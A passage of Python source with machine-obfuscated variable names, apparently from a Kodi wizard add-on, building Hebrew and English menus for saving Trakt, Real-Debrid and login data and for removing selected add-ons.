	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0O00OOOO0OO00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3454
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00000OO00O00OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3455
def Menu ():#line:3456
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3457
def saveMenu ():#line:3459
	O0000OO00O0000000 ='[COLOR yellow]מופעל[/COLOR]';O0O00OO000OO00OO0 ='[COLOR blue]מבוטל[/COLOR]'#line:3461
	O00O00OO0O0000000 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3462
	OO00O0OOO00OO0OOO ='true'if KEEPMOVIELIST =='true'else 'false'#line:3463
	O0OO00OO0OO0OOO00 ='true'if KEEPINFO =='true'else 'false'#line:3464
	O0O000OOOOO0O0O0O ='true'if KEEPSOUND =='true'else 'false'#line:3466
	OO00O00000O00O00O ='true'if KEEPVIEW =='true'else 'false'#line:3467
	OOOO0OO00O0OOO00O ='true'if KEEPSKIN =='true'else 'false'#line:3468
	OOO00O0000000O0OO ='true'if KEEPSKIN2 =='true'else 'false'#line:3469
	OO00O000O00O0O00O ='true'if KEEPSKIN3 =='true'else 'false'#line:3470
	O00OO0O000OO0OO00 ='true'if KEEPADDONS =='true'else 'false'#line:3471
	OO00OOO0OOOO0O00O ='true'if KEEPPVR =='true'else 'false'#line:3472
	O0000O00O0O0O000O ='true'if KEEPTVLIST =='true'else 'false'#line:3473
	O000OOOO0000O000O ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3474
	O00OOOO000000OOO0 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3475
	OOOO0000O0O000OOO ='true'if KEEPHUBTV =='true'else 'false'#line:3476
	O0000OOOOO0O0O00O ='true'if KEEPHUBVOD =='true'else 'false'#line:3477
	O0000O0O000O0O0O0 ='true'if KEEPHUBSPORT =='true'else 'false'#line:3478
	OOO000000OO0O0O00 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3479
	OOO00O0O00O0O0O0O ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3480
	OO0O0OOO00O00000O ='true'if KEEPHUBMENU =='true'else 'false'#line:3481
	OOOOO000OOOOO0O00 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3482
	O0O00O0000OO00O00 ='true'if KEEPTRAKT =='true'else 'false'#line:3483
	O000OOO0000OOO00O ='true'if KEEPREAL =='true'else 'false'#line:3484
	O000000O000OO0O00 ='true'if KEEPRD2 =='true'else 'false'#line:3485
	O000O000OOO00OO0O ='true'if KEEPTORNET =='true'else 'true'#line:3486
	OOO0O0OO0O0O00O0O ='true'if KEEPLOGIN =='true'else 'false'#line:3487
	OOOO0OO0O000OO0OO ='true'if KEEPSOURCES =='true'else 'false'#line:3488
	O000OOOOO0OO0OOOO ='true'if KEEPADVANCED =='true'else 'false'#line:3489
	O00O0OOO00OOOOOOO ='true'if KEEPPROFILES =='true'else 'false'#line:3490
	OOOO00O0OOO0000O0 ='true'if KEEPFAVS =='true'else 'false'#line:3491
	OO0OOOO00O0O0O0OO ='true'if KEEPREPOS =='true'else 'false'#line:3492
	O00OOO00O00O000OO ='true'if KEEPSUPER =='true'else 'false'#line:3493
	O0000O0O0O00OOO0O ='true'if KEEPWHITELIST =='true'else 'false'#line:3494
	OOOO0O00OOO0O0OOO ='true'if KEEPWEATHER =='true'else 'false'#line:3495
	O0OO00O0O000OO000 ='true'if KEEPVICTORY =='true'else 'false'#line:3496
	O0OO00OOOO00OOO0O ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3497
	if O0000O0O0O00OOO0O =='true':#line:3499
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3500
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3501
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3502
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3503
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3504
	addFile ('%s שמירת חשבון RD:  '%O000OOO0000OOO00O .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3507
	addFile ('%s שמירת חשבון טראקט:  '%O0O00O0000OO00O00 .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3508
	addFile ('%s שמירת מועדפים:  '%OOOO00O0OOO0000O0 .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3511
	addFile ('%s שמירת לקוח טלוויזיה:  '%OO00OOO0OOOO0O00O .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3512
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0OO00O0O000OO000 .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3513
	addFile ('%s שמירת חשבון טלמדיה:  '%O0OO00OOOO00OOO0O .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3514
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O0000O00O0O0O000O .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3515
	addFile ('%s שמירת אריח סרטים:  '%O000OOOO0000O000O .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3516
	addFile ('%s שמירת אריח סדרות:  '%O00OOOO000000OOO0 .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3517
	addFile ('%s שמירת אריח טלויזיה:  '%OOOO0000O0O000OOO .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3518
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O0000OOOOO0O0O00O .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3519
	addFile ('%s שמירת אריח ספורט:  '%O0000O0O000O0O0O0 .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3520
	addFile ('%s שמירת אריח ילדים:  '%OOO000000OO0O0O00 .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3521
	addFile ('%s שמירת אריח מוסיקה:  '%OOO00O0O00O0O0O0O .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3522
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OO0O0OOO00O00000O .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3523
	addFile ('%s שמירת כל האריחים בסקין:  '%OOOO0OO00O0OOO00O .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3524
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OOOO0O00OOO0O0OOO .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3525
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O00OO0O000OO0OO00 .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3531
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O0OO00OO0OO0OOO00 .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3532
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OO00O0OOO00OO0OOO .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3535
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%OOOO0OO0O000OO0OO .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3536
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O0O000OOOOO0O0O0O .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3537
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OO00O00000O00O00O .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3539
	addFile ('%s שמירת פליליסט לאודר:  '%OOOOO000OOOOO0O00 .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3540
	addFile ('%s שמירת הגדרות באפר: '%O000OOOOO0OO0OOOO .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3545
	addFile ('%s שמירת רשימות ריפו:  '%OO0OOOO00O0O0O0OO .replace ('true',O0000OO00O0000000 ).replace ('false',O0O00OO000OO00OO0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3547
	setView ('files','viewType')#line:3549
def traktMenu ():#line:3551
	O0O0000OOOO0O0O00 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3552
	OO000OO00O0OOOO0O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3553
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3554
	addFile ('Save Trakt Data: %s'%O0O0000OOOO0O0O00 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3555
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OO000OO00O0OOOO0O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3556
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3557
	for O0O0000OOOO0O0O00 in traktit .ORDER :#line:3559
		O00OO0OO000O00O00 =TRAKTID [O0O0000OOOO0O0O00 ]['name']#line:3560
		O00O000O00OOO0O0O =TRAKTID [O0O0000OOOO0O0O00 ]['path']#line:3561
		O000O0O0O00O0O0OO =TRAKTID [O0O0000OOOO0O0O00 ]['saved']#line:3562
		OO0OO0O0OOO00OO0O =TRAKTID [O0O0000OOOO0O0O00 ]['file']#line:3563
		O0OOOOOOO0OOOOOOO =wiz .getS (O000O0O0O00O0O0OO )#line:3564
		O0OO0OO00O00O0OO0 =traktit .traktUser (O0O0000OOOO0O0O00 )#line:3565
		O000O00OOOOOO0O0O =TRAKTID [O0O0000OOOO0O0O00 ]['icon']if os .path .exists (O00O000O00OOO0O0O )else ICONTRAKT #line:3566
		OO0OOOO000OO00O0O =TRAKTID [O0O0000OOOO0O0O00 ]['fanart']if os .path .exists (O00O000O00OOO0O0O )else FANART #line:3567
		OOOO0O0OO00OOO000 =createMenu ('saveaddon','Trakt',O0O0000OOOO0O0O00 )#line:3568
		O0O000OO0OOOO0000 =createMenu ('save','Trakt',O0O0000OOOO0O0O00 )#line:3569
		OOOO0O0OO00OOO000 .append ((THEME2 %'%s Settings'%O00OO0OO000O00O00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O0O0000OOOO0O0O00 )))#line:3570
		addFile ('[+]-> %s'%O00OO0OO000O00O00 ,'',icon =O000O00OOOOOO0O0O ,fanart =OO0OOOO000OO00O0O ,themeit =THEME3 )#line:3572
		if not os .path .exists (O00O000O00OOO0O0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O000O00OOOOOO0O0O ,fanart =OO0OOOO000OO00O0O ,menu =OOOO0O0OO00OOO000 )#line:3573
		elif not O0OO0OO00O00O0OO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O0O0000OOOO0O0O00 ,icon =O000O00OOOOOO0O0O ,fanart =OO0OOOO000OO00O0O ,menu =OOOO0O0OO00OOO000 )#line:3574
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0OO0OO00O00O0OO0 ,'authtrakt',O0O0000OOOO0O0O00 ,icon =O000O00OOOOOO0O0O ,fanart =OO0OOOO000OO00O0O ,menu =OOOO0O0OO00OOO000 )#line:3575
		if O0OOOOOOO0OOOOOOO =="":#line:3576
			if os .path .exists (OO0OO0O0OOO00OO0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O0O0000OOOO0O0O00 ,icon =O000O00OOOOOO0O0O ,fanart =OO0OOOO000OO00O0O ,menu =O0O000OO0OOOO0000 )#line:3577
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O0O0000OOOO0O0O00 ,icon =O000O00OOOOOO0O0O ,fanart =OO0OOOO000OO00O0O ,menu =O0O000OO0OOOO0000 )#line:3578
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OOOOOOO0OOOOOOO ,'',icon =O000O00OOOOOO0O0O ,fanart =OO0OOOO000OO00O0O ,menu =O0O000OO0OOOO0000 )#line:3579
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3581
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3582
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3583
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3584
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3585
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3586
	setView ('files','viewType')#line:3587
def realMenu ():#line:3589
	O00OOO00OO0OOOOO0 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3590
	OOOOO00OOO0OO000O =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3591
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3592
	addFile ('Save Real Debrid Data: %s'%O00OOO00OO0OOOOO0 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3593
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OOOOO00OOO0OO000O ),'',icon =ICONREAL ,themeit =THEME3 )#line:3594
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3595
	for O0O00O0000O00O0O0 in debridit .ORDER :#line:3597
		O00O0OOO00O0OO0O0 =DEBRIDID [O0O00O0000O00O0O0 ]['name']#line:3598
		O00OO0OOOO00OOOOO =DEBRIDID [O0O00O0000O00O0O0 ]['path']#line:3599
		OO00000000OOO0000 =DEBRIDID [O0O00O0000O00O0O0 ]['saved']#line:3600
		O0OO0OO0000O00O0O =DEBRIDID [O0O00O0000O00O0O0 ]['file']#line:3601
		O0OOOO00000OO00OO =wiz .getS (OO00000000OOO0000 )#line:3602
		O00O0OOO0000OOOO0 =debridit .debridUser (O0O00O0000O00O0O0 )#line:3603
		OOOO0O0OOO00OOOOO =DEBRIDID [O0O00O0000O00O0O0 ]['icon']if os .path .exists (O00OO0OOOO00OOOOO )else ICONREAL #line:3604
		O0O00OOOO0000OOOO =DEBRIDID [O0O00O0000O00O0O0 ]['fanart']if os .path .exists (O00OO0OOOO00OOOOO )else FANART #line:3605
		OO0OOOOOO0000O00O =createMenu ('saveaddon','Debrid',O0O00O0000O00O0O0 )#line:3606
		OOO0O0OO0O000OOO0 =createMenu ('save','Debrid',O0O00O0000O00O0O0 )#line:3607
		OO0OOOOOO0000O00O .append ((THEME2 %'%s Settings'%O00O0OOO00O0OO0O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0O00O0000O00O0O0 )))#line:3608
		addFile ('[+]-> %s'%O00O0OOO00O0OO0O0 ,'',icon =OOOO0O0OOO00OOOOO ,fanart =O0O00OOOO0000OOOO ,themeit =THEME3 )#line:3610
		if not os .path .exists (O00OO0OOOO00OOOOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOO0O0OOO00OOOOO ,fanart =O0O00OOOO0000OOOO ,menu =OO0OOOOOO0000O00O )#line:3611
		elif not O00O0OOO0000OOOO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0O00O0000O00O0O0 ,icon =OOOO0O0OOO00OOOOO ,fanart =O0O00OOOO0000OOOO ,menu =OO0OOOOOO0000O00O )#line:3612
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00O0OOO0000OOOO0 ,'authdebrid',O0O00O0000O00O0O0 ,icon =OOOO0O0OOO00OOOOO ,fanart =O0O00OOOO0000OOOO ,menu =OO0OOOOOO0000O00O )#line:3613
		if O0OOOO00000OO00OO =="":#line:3614
			if os .path .exists (O0OO0OO0000O00O0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0O00O0000O00O0O0 ,icon =OOOO0O0OOO00OOOOO ,fanart =O0O00OOOO0000OOOO ,menu =OOO0O0OO0O000OOO0 )#line:3615
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0O00O0000O00O0O0 ,icon =OOOO0O0OOO00OOOOO ,fanart =O0O00OOOO0000OOOO ,menu =OOO0O0OO0O000OOO0 )#line:3616
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OOOO00000OO00OO ,'',icon =OOOO0O0OOO00OOOOO ,fanart =O0O00OOOO0000OOOO ,menu =OOO0O0OO0O000OOO0 )#line:3617
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3619
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3620
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3621
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3622
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3623
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3624
	setView ('files','viewType')#line:3625
def loginMenu ():#line:3627
	O0O0OO0OO00O0OOOO ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3628
	O000O0OOO00OO0O0O =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3629
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3630
	addFile ('Save Login Data: %s'%O0O0OO0OO00O0OOOO ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3631
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O000O0OOO00OO0O0O ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3632
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3633
	for O0O0OO0OO00O0OOOO in loginit .ORDER :#line:3635
		O0OO00O0OOO0O0000 =LOGINID [O0O0OO0OO00O0OOOO ]['name']#line:3636
		O00O0OO0O000000OO =LOGINID [O0O0OO0OO00O0OOOO ]['path']#line:3637
		OO0O0000O0O0OO000 =LOGINID [O0O0OO0OO00O0OOOO ]['saved']#line:3638
		O00O00OO000O0000O =LOGINID [O0O0OO0OO00O0OOOO ]['file']#line:3639
		OO0OOOO0O0O0O00OO =wiz .getS (OO0O0000O0O0OO000 )#line:3640
		O0O00OO0O00000O00 =loginit .loginUser (O0O0OO0OO00O0OOOO )#line:3641
		OOO00OO00O0OO0O00 =LOGINID [O0O0OO0OO00O0OOOO ]['icon']if os .path .exists (O00O0OO0O000000OO )else ICONLOGIN #line:3642
		O000OOOOOOO0O0O0O =LOGINID [O0O0OO0OO00O0OOOO ]['fanart']if os .path .exists (O00O0OO0O000000OO )else FANART #line:3643
		O0O0O0OOO0O00OO00 =createMenu ('saveaddon','Login',O0O0OO0OO00O0OOOO )#line:3644
		OO00OO000000OO000 =createMenu ('save','Login',O0O0OO0OO00O0OOOO )#line:3645
		O0O0O0OOO0O00OO00 .append ((THEME2 %'%s Settings'%O0OO00O0OOO0O0000 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O0O0OO0OO00O0OOOO )))#line:3646
		addFile ('[+]-> %s'%O0OO00O0OOO0O0000 ,'',icon =OOO00OO00O0OO0O00 ,fanart =O000OOOOOOO0O0O0O ,themeit =THEME3 )#line:3648
		if not os .path .exists (O00O0OO0O000000OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOO00OO00O0OO0O00 ,fanart =O000OOOOOOO0O0O0O ,menu =O0O0O0OOO0O00OO00 )#line:3649
		elif not O0O00OO0O00000O00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O0O0OO0OO00O0OOOO ,icon =OOO00OO00O0OO0O00 ,fanart =O000OOOOOOO0O0O0O ,menu =O0O0O0OOO0O00OO00 )#line:3650
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O00OO0O00000O00 ,'authlogin',O0O0OO0OO00O0OOOO ,icon =OOO00OO00O0OO0O00 ,fanart =O000OOOOOOO0O0O0O ,menu =O0O0O0OOO0O00OO00 )#line:3651
		if OO0OOOO0O0O0O00OO =="":#line:3652
			if os .path .exists (O00O00OO000O0000O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O0O0OO0OO00O0OOOO ,icon =OOO00OO00O0OO0O00 ,fanart =O000OOOOOOO0O0O0O ,menu =OO00OO000000OO000 )#line:3653
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O0O0OO0OO00O0OOOO ,icon =OOO00OO00O0OO0O00 ,fanart =O000OOOOOOO0O0O0O ,menu =OO00OO000000OO000 )#line:3654
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0OOOO0O0O0O00OO ,'',icon =OOO00OO00O0OO0O00 ,fanart =O000OOOOOOO0O0O0O ,menu =OO00OO000000OO000 )#line:3655
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3657
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3658
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3659
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3660
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3661
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3662
	setView ('files','viewType')#line:3663
def fixUpdate ():#line:3665
	if KODIV <17 :#line:3666
		O00O00OO000000O0O =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3667
		try :#line:3668
			os .remove (O00O00OO000000O0O )#line:3669
		except Exception as O0O00000OO0O000OO :#line:3670
			wiz .log ("Unable to remove %s, Purging DB"%O00O00OO000000O0O )#line:3671
			wiz .purgeDb (O00O00OO000000O0O )#line:3672
	else :#line:3673
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3674
def removeAddonMenu ():#line:3676
	O000O00O0O0O0OO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3677
	O00OO0OO0000OOOO0 =[];OO0OO0000OO0O0O00 =[]#line:3678
	for O0O000OO0OO0O00O0 in sorted (O000O00O0O0O0OO0O ,key =lambda O000O0OOOOO0OOO0O :O000O0OOOOO0OOO0O ):#line:3679
		OOOO000O00O000000 =os .path .split (O0O000OO0OO0O00O0 [:-1 ])[1 ]#line:3680
		if OOOO000O00O000000 in EXCLUDES :continue #line:3681
		elif OOOO000O00O000000 in DEFAULTPLUGINS :continue #line:3682
		elif OOOO000O00O000000 =='packages':continue #line:3683
		O000000000OOO0OO0 =os .path .join (O0O000OO0OO0O00O0 ,'addon.xml')#line:3684
		if os .path .exists (O000000000OOO0OO0 ):#line:3685
			O00OO00O0000000O0 =open (O000000000OOO0OO0 )#line:3686
			O00O00O00OOOOOOO0 =O00OO00O0000000O0 .read ()#line:3687
			OOO00O00OO0O00O00 =wiz .parseDOM (O00O00O00OOOOOOO0 ,'addon',ret ='id')#line:3688
			O00OOO00OO00O00OO =OOOO000O00O000000 if len (OOO00O00OO0O00O00 )==0 else OOO00O00OO0O00O00 [0 ]#line:3690
			try :#line:3691
				OOO0OO0000OOOOOOO =xbmcaddon .Addon (id =O00OOO00OO00O00OO )#line:3692
				O00OO0OO0000OOOO0 .append (OOO0OO0000OOOOOOO .getAddonInfo ('name'))#line:3693
				OO0OO0000OO0O0O00 .append (O00OOO00OO00O00OO )#line:3694
			except :#line:3695
				pass #line:3696
	if len (O00OO0OO0000OOOO0 )==0 :#line:3697
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3698
		return #line:3699
	if KODIV >16 :#line:3700
		O00000O0OO00O0OO0 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O00OO0OO0000OOOO0 )#line:3701
	else :#line:3702
		O00000O0OO00O0OO0 =[];O00OOOOO0OOOO000O =0 #line:3703
		O00OOOO000OO0OO0O =["-- Click here to Continue --"]+O00OO0OO0000OOOO0 #line:3704
		while not O00OOOOO0OOOO000O ==-1 :#line:3705
			O00OOOOO0OOOO000O =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O00OOOO000OO0OO0O )#line:3706
			if O00OOOOO0OOOO000O ==-1 :break #line:3707
			elif O00OOOOO0OOOO000O ==0 :break #line:3708
			else :#line:3709
				O0O0000O0O000O00O =(O00OOOOO0OOOO000O -1 )#line:3710
				if O0O0000O0O000O00O in O00000O0OO00O0OO0 :#line:3711
					O00000O0OO00O0OO0 .remove (O0O0000O0O000O00O )#line:3712
					O00OOOO000OO0OO0O [O00OOOOO0OOOO000O ]=O00OO0OO0000OOOO0 [O0O0000O0O000O00O ]#line:3713
				else :#line:3714
					O00000O0OO00O0OO0 .append (O0O0000O0O000O00O )#line:3715
					O00OOOO000OO0OO0O [O00OOOOO0OOOO000O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O00OO0OO0000OOOO0 [O0O0000O0O000O00O ])#line:3716
	if O00000O0OO00O0OO0 ==None :return #line:3717
	if len (O00000O0OO00O0OO0 )>0 :#line:3718
		wiz .addonUpdates ('set')#line:3719
		for OO0OOO0O0O0OOOOOO in O00000O0OO00O0OO0 :#line:3720
			removeAddon (OO0OO0000OO0O0O00 [OO0OOO0O0O0OOOOOO ],O00OO0OO0000OOOO0 [OO0OOO0O0O0OOOOOO ],True )#line:3721
		xbmc .sleep (1000 )#line:3723
		if INSTALLMETHOD ==1 :O00OOO00OO0OO0000 =1 #line:3725
		elif INSTALLMETHOD ==2 :O00OOO00OO0OO0000 =0 #line:3726
		else :O00OOO00OO0OO0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3727
		if O00OOO00OO0OO0000 ==1 :wiz .reloadFix ('remove addon')#line:3728
